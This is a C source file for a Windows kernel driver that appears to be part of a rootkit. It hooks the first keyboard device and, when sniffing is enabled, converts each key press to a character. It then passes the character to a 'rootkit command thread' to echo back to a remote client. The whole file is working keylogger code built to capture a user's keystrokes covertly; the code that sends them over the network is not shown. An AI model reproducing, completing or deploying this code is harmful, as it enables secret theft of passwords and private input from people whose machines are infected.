#include "rk_driver.h"
#include "rk_keyboard.h"
#include "rk_command.h"

extern char g_command_signal[256]; //to send commands to the worker thread
extern KEVENT command_signal_event;
extern ULONG g_number_of_pending_IRPs;

/* we must make sure to pass all hooked requests onward... */
NTSTATUS cmdHookKeyboard(IN PDRIVER_OBJECT DriverObject){

	CCHAR		 ntNameBuffer[64];
    STRING		 ntNameString;
    UNICODE_STRING       ntUnicodeString;
    NTSTATUS             status;

	DbgPrint("cmdHookKeyboard() called\n");
	
    //
    // Only hook onto the first keyboard's chain.
    //

    sprintf( ntNameBuffer, "\\Device\\KeyboardClass0" );
    RtlInitAnsiString( &ntNameString, ntNameBuffer );
    RtlAnsiStringToUnicodeString( &ntUnicodeString, &ntNameString, TRUE );

    //
    // Create device object for the keyboard.
    //

    status = IoCreateDevice( DriverObject,
			     0,
			     NULL,
			     FILE_DEVICE_KEYBOARD,
			     0,
			     FALSE,
			     &gKbdHookDevice );

    if( !NT_SUCCESS(status) ) {

	 DbgPrint(("Ctrl2cap: Keyboard hook failed to create device!\n"));

	 RtlFreeUnicodeString( &ntUnicodeString );

	 return STATUS_SUCCESS;
    }
   
    //
    // Keyboard uses buffered I/O so we must as well.
    //

    gKbdHookDevice->Flags |= DO_BUFFERED_IO;

    //
    // Attach to the keyboard chain.
    //

    status = IoAttachDevice( gKbdHookDevice, &ntUnicodeString, &gKbdTopOfStack );

    if( !NT_SUCCESS(status) ) {

	 DbgPrint(("Ctrl2cap: Connect with keyboard failed!\n"));

	 IoDeleteDevice( gKbdHookDevice );

	 RtlFreeUnicodeString( &ntUnicodeString );
	
	 return STATUS_SUCCESS;
    }

    //
    // Done! Just free our string and be on our way...
    //

    RtlFreeUnicodeString( &ntUnicodeString );

    DbgPrint(("Ctrl2cap: Successfully connected to keyboard device\n"));

    //
    // This line simply demonstrates how a driver can print
    // stuff to the bluescreen during system initialization.
    //
  
    //HalDisplayString( "Ctrl2cap Initialized\n" );

    return STATUS_SUCCESS;

}


char scancodesL[] = "`-1234567890---\tqwertyuiop[]--asdfghjkl;'---zxcvbnm,./----- ---";
char scancodesU[] = "~-!@#$%^&*()---\tQWERTYUIOP{}--ASDFGHJKL:\"---ZXCVBNM<>?----- ---";

//----------------------------------------------------------------------
// 
// OnReadComplete
//
// Gets control after a read operation has completed.
//
//----------------------------------------------------------------------
NTSTATUS OnKbdReadComplete( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp,
				IN PVOID Context )
{
    PIO_STACK_LOCATION        IrpSp;
    PKEYBOARD_INPUT_DATA      KeyData;
    int                       numKeys, i;
    KIRQL					  aIrqL;

	DbgPrint("OnKbdReadComplete called\n");
    //
    // Request completed - look at the result.
    //

    IrpSp = IoGetCurrentIrpStackLocation( Irp );
    if( NT_SUCCESS( Irp->IoStatus.Status ) ) {
		// just frobbing the MakeCode handles both the up-key
        // and down-key cases since the up/down information is specified
        // seperately in the Flags field of the keyboard input data 
        // (0 means key-down, 1 means key-up).
        //
  	    if(g_sniff_keys)
  	    {
	  	    KeyData = Irp->AssociatedIrp.SystemBuffer;
	        if(KeyData)
	        {
		        numKeys = Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
		        for( i = 0; i < numKeys; i++ ) 
		        {
		        	if(0 == KeyData[i].Flags) /* key down */
		        	{
		        		/////////////////////////////////////////////////
		        		// since we are in a hook, we cannot just send
		        		// a packet.  Instead we must send a command
		        		// to the rootkit command thread to 'echo' 
		        		// this character back to the client
		        		/////////////////////////////////////////////////
			        	
						if(KeyData[i].MakeCode<64)
						{
							char _t[255];
			        		sprintf(_t, "echo %c", scancodesL[(KeyData[i].MakeCode)] );
			        		
							//----[ spinlock ]-------------------------------
							KeAcquireSpinLock(&GlobalArraySpinLock, &aIrqL);
							memset(g_command_signal, NULL, 255);
							memcpy(g_command_signal, _t, 6);
							KeReleaseSpinLock(&GlobalArraySpinLock, aIrqL);
							//-----------------------------------------------
							KeSetEvent(&command_signal_event, 1, FALSE);
						}
	 				}
		        }
		    }
	    }
    }
    if( Irp->PendingReturned ) {
        IoMarkIrpPending( Irp );
    }
    g_number_of_pending_IRPs--;
    return Irp->IoStatus.Status;
}
